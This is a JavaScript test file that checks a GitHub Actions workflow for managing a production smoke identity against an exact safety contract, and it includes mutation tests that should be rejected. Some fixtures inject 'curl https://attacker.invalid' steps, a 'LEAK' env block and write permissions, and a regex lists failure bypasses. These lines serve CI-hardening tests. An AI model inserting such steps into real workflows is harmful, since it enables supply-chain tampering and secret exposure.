import assert from 'node:assert/strict';
import fs from 'node:fs';
import test from 'node:test';
import { isMap, isScalar, parseDocument } from 'yaml';

const LIFECYCLE_WORKFLOW_URL = new URL(
  '../.github/workflows/manage-smoke-identity.yml',
  import.meta.url,
);
const DEPLOY_WORKFLOW_URL = new URL(
  '../.github/workflows/deploy-worker.yml',
  import.meta.url,
);
const SHARED_CONCURRENCY = /^concurrency:\n  group: hereisorder-production-\$\{\{ github\.ref \}\}\n  cancel-in-progress: false\n  queue: max$/m;
const FAILURE_BYPASS = /continue-on-error|always\(|failure\(|\|\|\s*true|set\s+\+e/;
const CHECKOUT_ACTION = 'actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0';
const SETUP_NODE_ACTION = 'actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e';
const ACCOUNT_ID_LINE = '          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}';
const PASSWORD_LINE = '          PRODUCTION_SMOKE_PASSWORD: ${{ secrets.PRODUCTION_SMOKE_PASSWORD }}';
const CONFIRMATION_LINE = '          SMOKE_IDENTITY_CONFIRMATION: ${{ inputs.confirmation }}';
const CANONICAL_LIFECYCLE_WORKFLOW = [
  'name: Manage production smoke identity',
  '',
  'on:',
  '  workflow_dispatch:',
  '    inputs:',
  '      action:',
  '        description: Fixed lifecycle operation',
  '        required: true',
  '        type: choice',
  '        options:',
  '          - provision',
  '          - rotate',
  '          - disable',
  '      confirmation:',
  '        description: Type the exact MANAGE confirmation for the selected action',
  '        required: true',
  '        type: string',
  '',
  'permissions:',
  '  contents: read',
  '',
  'concurrency:',
  '  group: hereisorder-production-${{ github.ref }}',
  '  cancel-in-progress: false',
  '  queue: max',
  '',
  'jobs:',
  '  manage:',
  '    name: Manage fixed production smoke identity',
  '    runs-on: ubuntu-latest',
  '    timeout-minutes: 10',
  '    steps:',
  '      - name: Reject a non-main ref',
  '        if: github.ref != \'refs/heads/main\'',
  '        run: exit 1',
  '',
  '      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0',
  '        with:',
  '          persist-credentials: false',
  '',
  '      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0',
  '        with:',
  '          node-version: \'22.23.1\'',
  '          cache: \'npm\'',
  '',
  '      - name: Install dependencies',
  '        run: npm ci',
  '',
  '      - name: Provision fixed smoke identity',
  '        if: inputs.action == \'provision\'',
  '        run: npm run db:manage-smoke-identity -- provision --remote',
  '        env:',
  '          CI: \'true\'',
  '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
  '          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}',
  '          PRODUCTION_SMOKE_PASSWORD: ${{ secrets.PRODUCTION_SMOKE_PASSWORD }}',
  '          SMOKE_IDENTITY_CONFIRMATION: ${{ inputs.confirmation }}',
  '',
  '      - name: Rotate fixed smoke identity',
  '        if: inputs.action == \'rotate\'',
  '        run: npm run db:manage-smoke-identity -- rotate --remote',
  '        env:',
  '          CI: \'true\'',
  '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
  '          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}',
  '          PRODUCTION_SMOKE_PASSWORD: ${{ secrets.PRODUCTION_SMOKE_PASSWORD }}',
  '          SMOKE_IDENTITY_CONFIRMATION: ${{ inputs.confirmation }}',
  '',
  '      - name: Disable fixed smoke identity',
  '        if: inputs.action == \'disable\'',
  '        run: npm run db:manage-smoke-identity -- disable --remote',
  '        env:',
  '          CI: \'true\'',
  '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
  '          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}',
  '          SMOKE_IDENTITY_CONFIRMATION: ${{ inputs.confirmation }}',
  '',
  '      - name: Reject an invalid lifecycle action',
  '        if: inputs.action != \'provision\' && inputs.action != \'rotate\' && inputs.action != \'disable\'',
  '        run: exit 1',
].join('\n') + '\n';

function readLifecycleWorkflow() {
  return fs.readFileSync(LIFECYCLE_WORKFLOW_URL, 'utf8');
}

function readDeployWorkflow() {
  return fs.readFileSync(DEPLOY_WORKFLOW_URL, 'utf8');
}

function assertPlainMapping(value, message) {
  assert.ok(
    value !== null
      && typeof value === 'object'
      && !Array.isArray(value)
      && Object.getPrototypeOf(value) === Object.prototype,
    message,
  );
  return value;
}

function hasPlainScalarKey(pair, value) {
  return isScalar(pair?.key)
    && pair.key.type === 'PLAIN'
    && pair.key.source === value
    && pair.key.value === value;
}

function assertLifecycleSafety(contents) {
  assert.equal(typeof contents, 'string', 'workflow source must be a string');

  const document = parseDocument(contents, {
    merge: false,
    schema: 'core',
    uniqueKeys: true,
  });
  assert.deepEqual(
    document.errors,
    [],
    'workflow YAML must be duplicate-key-free and parse without errors',
  );
  assert.deepEqual(document.warnings, [], 'workflow YAML must parse without warnings');
  assert.ok(isMap(document.contents), 'workflow must use a plain top-level mapping');

  const workflow = assertPlainMapping(
    document.toJS({ maxAliasCount: 0 }),
    'workflow must use a plain top-level mapping',
  );
  assert.deepEqual(
    Object.keys(workflow),
    ['name', 'on', 'permissions', 'concurrency', 'jobs'],
    'top-level workflow keys must be exact and workflow env is forbidden',
  );
  assert.equal(
    workflow.name,
    'Manage production smoke identity',
    'workflow name must be exact',
  );

  const triggerPair = document.contents.items.find((pair) => (
    isScalar(pair.key) && pair.key.value === 'on'
  ));
  const dispatchPair = isMap(triggerPair?.value) && triggerPair.value.items.length === 1
    ? triggerPair.value.items[0]
    : undefined;
  assert.ok(
    hasPlainScalarKey(triggerPair, 'on')
      && isMap(triggerPair.value)
      && hasPlainScalarKey(dispatchPair, 'workflow_dispatch'),
    'workflow triggers must contain only plain workflow_dispatch',
  );
  assert.deepEqual(
    workflow.on,
    {
      workflow_dispatch: {
        inputs: {
          action: {
            description: 'Fixed lifecycle operation',
            required: true,
            type: 'choice',
            options: ['provision', 'rotate', 'disable'],
          },
          confirmation: {
            description: 'Type the exact MANAGE confirmation for the selected action',
            required: true,
            type: 'string',
          },
        },
      },
    },
    'workflow_dispatch input and choice structure must be exact',
  );
  assert.deepEqual(
    workflow.permissions,
    { contents: 'read' },
    'permissions must be exact read-only contents',
  );
  assert.deepEqual(
    workflow.concurrency,
    {
      group: 'hereisorder-production-${{ github.ref }}',
      'cancel-in-progress': false,
      queue: 'max',
    },
    'concurrency must be exact, non-cancelling, and losslessly queued',
  );

  const jobs = assertPlainMapping(workflow.jobs, 'jobs must contain only manage');
  assert.deepEqual(Object.keys(jobs), ['manage'], 'jobs must contain only manage');
  const manage = assertPlainMapping(
    jobs.manage,
    'manage job must have exact owned keys without job-level if or env',
  );
  assert.deepEqual(
    Object.keys(manage),
    ['name', 'runs-on', 'timeout-minutes', 'steps'],
    'manage job must have exact owned keys without job-level if or env',
  );
  assert.deepEqual(
    {
      name: manage.name,
      'runs-on': manage['runs-on'],
      'timeout-minutes': manage['timeout-minutes'],
    },
    {
      name: 'Manage fixed production smoke identity',
      'runs-on': 'ubuntu-latest',
      'timeout-minutes': 10,
    },
    'manage job name, runner, and timeout must be exact',
  );
  assert.ok(
    Array.isArray(manage.steps) && manage.steps.length === 8,
    'manage job must contain exactly the fixed ordered 8 steps',
  );

  const steps = manage.steps;
  assert.deepEqual(
    steps[0],
    {
      name: 'Reject a non-main ref',
      if: "github.ref != 'refs/heads/main'",
      run: 'exit 1',
    },
    'non-main guard must be the exact first step',
  );
  assert.deepEqual(
    steps[1],
    {
      uses: CHECKOUT_ACTION,
      with: { 'persist-credentials': false },
    },
    'checkout step must be exact and own persist-credentials',
  );
  assert.deepEqual(
    steps[2],
    {
      uses: SETUP_NODE_ACTION,
      with: {
        'node-version': '22.23.1',
        cache: 'npm',
      },
    },
    'setup-node step must be exact',
  );
  assert.deepEqual(
    steps[3],
    {
      name: 'Install dependencies',
      run: 'npm ci',
    },
    'install step must be exact',
  );

  const sharedActionEnv = {
    CI: 'true',
    CLOUDFLARE_API_TOKEN: '${{ secrets.CLOUDFLARE_API_TOKEN }}',
    CLOUDFLARE_ACCOUNT_ID: '${{ secrets.CLOUDFLARE_ACCOUNT_ID }}',
  };
  const password = {
    PRODUCTION_SMOKE_PASSWORD: '${{ secrets.PRODUCTION_SMOKE_PASSWORD }}',
  };
  const confirmation = {
    SMOKE_IDENTITY_CONFIRMATION: '${{ inputs.confirmation }}',
  };
  assert.deepEqual(
    steps[4],
    {
      name: 'Provision fixed smoke identity',
      if: "inputs.action == 'provision'",
      run: 'npm run db:manage-smoke-identity -- provision --remote',
      env: { ...sharedActionEnv, ...password, ...confirmation },
    },
    'provision step must have exact condition, run, and env',
  );
  assert.deepEqual(
    steps[5],
    {
      name: 'Rotate fixed smoke identity',
      if: "inputs.action == 'rotate'",
      run: 'npm run db:manage-smoke-identity -- rotate --remote',
      env: { ...sharedActionEnv, ...password, ...confirmation },
    },
    'rotate step must have exact condition, run, and env',
  );
  assert.deepEqual(
    steps[6],
    {
      name: 'Disable fixed smoke identity',
      if: "inputs.action == 'disable'",
      run: 'npm run db:manage-smoke-identity -- disable --remote',
      env: { ...sharedActionEnv, ...confirmation },
    },
    'disable step must have exact condition, run, and env',
  );
  assert.deepEqual(
    steps[7],
    {
      name: 'Reject an invalid lifecycle action',
      if: "inputs.action != 'provision' && inputs.action != 'rotate' && inputs.action != 'disable'",
      run: 'exit 1',
    },
    'invalid-action guard must be exact',
  );
  assert.doesNotMatch(contents, FAILURE_BYPASS, 'lifecycle must not contain failure bypasses');
}

const dangerousMutations = [
  {
    name: 'adds a quoted schedule trigger',
    expected: /workflow triggers must contain only plain workflow_dispatch/,
    mutate(contents) {
      return contents.replace(
        '        type: string\n\npermissions:',
        '        type: string\n  "schedule":\n    - cron: "0 0 * * *"\n\npermissions:',
      );
    },
  },
  {
    name: 'adds a quoted job-level if',
    expected: /manage job must have exact owned keys without job-level if or env/,
    mutate(contents) {
      return contents.replace(
        '    name: Manage fixed production smoke identity\n    runs-on: ubuntu-latest',
        '    name: Manage fixed production smoke identity\n    "if": github.ref == \'refs/heads/main\'\n    runs-on: ubuntu-latest',
      );
    },
  },
  {
    name: 'adds an executable step with a quoted run key',
    expected: /manage job must contain exactly the fixed ordered 8 steps/,
    mutate(contents) {
      return contents.replace(
        '      - name: Reject an invalid lifecycle action',
        '      - name: Unexpected executable step\n        "run": curl https://attacker.invalid\n\n      - name: Reject an invalid lifecycle action',
      );
    },
  },
  {
    name: 'makes the invalid-action condition false',
    expected: /invalid-action guard must be exact/,
    mutate(contents) {
      return contents.replace(
        "if: inputs.action != 'provision' && inputs.action != 'rotate' && inputs.action != 'disable'",
        'if: false',
      );
    },
  },
  {
    name: 'grants contents write permission',
    expected: /permissions must be exact read-only contents/,
    mutate(contents) {
      return contents.replace('  contents: read', '  contents: write');
    },
  },
  {
    name: 'adds workflow-scoped env',
    expected: /top-level workflow keys must be exact and workflow env is forbidden/,
    mutate(contents) {
      return contents.replace(
        'permissions:\n  contents: read\n\nconcurrency:',
        'permissions:\n  contents: read\n\nenv:\n  LEAK: enabled\n\nconcurrency:',
      );
    },
  },
  {
    name: 'removes the rotate password',
    expected: /rotate step must have exact condition, run, and env/,
    mutate(contents) {
      const marker = [
        '      - name: Rotate fixed smoke identity',
        "        if: inputs.action == 'rotate'",
        '        run: npm run db:manage-smoke-identity -- rotate --remote',
        '        env:',
        "          CI: 'true'",
        '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
        ACCOUNT_ID_LINE,
        PASSWORD_LINE,
        CONFIRMATION_LINE,
      ].join('\n');
      return contents.replace(marker, marker.replace(`${PASSWORD_LINE}\n`, ''));
    },
  },
  {
    name: 'adds the password to disable without removing rotate password',
    expected: /disable step must have exact condition, run, and env/,
    mutate(contents) {
      const marker = `${ACCOUNT_ID_LINE}\n${CONFIRMATION_LINE}\n\n      - name: Reject an invalid lifecycle action`;
      return contents.replace(
        marker,
        `${ACCOUNT_ID_LINE}\n${PASSWORD_LINE}\n${CONFIRMATION_LINE}\n\n      - name: Reject an invalid lifecycle action`,
      );
    },
  },
  {
    name: 'removes the provision confirmation',
    expected: /provision step must have exact condition, run, and env/,
    mutate(contents) {
      const marker = `${CONFIRMATION_LINE}\n\n      - name: Rotate fixed smoke identity`;
      return contents.replace(marker, '      - name: Rotate fixed smoke identity');
    },
  },
  {
    name: 'suffixes the provision command with curl',
    expected: /provision step must have exact condition, run, and env/,
    mutate(contents) {
      return contents.replace(
        'run: npm run db:manage-smoke-identity -- provision --remote',
        'run: npm run db:manage-smoke-identity -- provision --remote && curl https://attacker.invalid',
      );
    },
  },
  {
    name: 'unpins the checkout action',
    expected: /checkout step must be exact and own persist-credentials/,
    mutate(contents) {
      return contents.replace(CHECKOUT_ACTION, 'actions/checkout@v7');
    },
  },
  {
    name: 'moves persist-credentials from checkout to setup-node',
    expected: /checkout step must be exact and own persist-credentials/,
    mutate(contents) {
      return contents
        .replace(
          '        with:\n          persist-credentials: false\n\n      - uses: actions/setup-node',
          '      - uses: actions/setup-node',
        )
        .replace(
          "        with:\n          node-version: '22.23.1'",
          "        with:\n          persist-credentials: false\n          node-version: '22.23.1'",
        );
    },
  },
  {
    name: 'changes the Node version',
    expected: /setup-node step must be exact/,
    mutate(contents) {
      return contents.replace("node-version: '22.23.1'", "node-version: '24'");
    },
  },
];

test('lifecycle workflow exactly matches the canonical safety contract', () => {
  assert.equal(readLifecycleWorkflow(), CANONICAL_LIFECYCLE_WORKFLOW);
});

test('lifecycle workflow satisfies independent semantic safety invariants', () => {
  assertLifecycleSafety(readLifecycleWorkflow());
});

test('lifecycle parser rejects duplicate YAML keys before semantic conversion', () => {
  const duplicateKeyWorkflow = readLifecycleWorkflow().replace(
    'permissions:\n  contents: read',
    'permissions:\n  contents: read\n  contents: write',
  );
  assert.throws(
    () => assertLifecycleSafety(duplicateKeyWorkflow),
    /workflow YAML must be duplicate-key-free and parse without errors/,
  );
});

test('lifecycle parser requires a plain top-level mapping', () => {
  assert.throws(
    () => assertLifecycleSafety('- name: not-a-workflow\n'),
    /workflow must use a plain top-level mapping/,
  );
});

test('deployment shares canonical lossless repository/ref concurrency', () => {
  const workflow = readDeployWorkflow();
  assert.match(workflow, SHARED_CONCURRENCY);
  assert.doesNotMatch(workflow, /group: \$\{\{ github\.workflow \}\}/);
});

test('lifecycle workflow has no failure-bypass surface', () => {
  assert.doesNotMatch(readLifecycleWorkflow(), FAILURE_BYPASS);
});

test('semantic lifecycle contract rejects dangerous mutations by invariant', async (t) => {
  const workflow = readLifecycleWorkflow();
  for (const { name, expected, mutate } of dangerousMutations) {
    await t.test(name, () => {
      const mutated = mutate(workflow);
      assert.notEqual(mutated, workflow, 'mutation fixture must change the workflow');
      const mutationDocument = parseDocument(mutated, { uniqueKeys: true });
      assert.deepEqual(mutationDocument.errors, [], 'mutation fixture must be valid YAML');
      assert.throws(() => assertLifecycleSafety(mutated), expected);
    });
  }
});
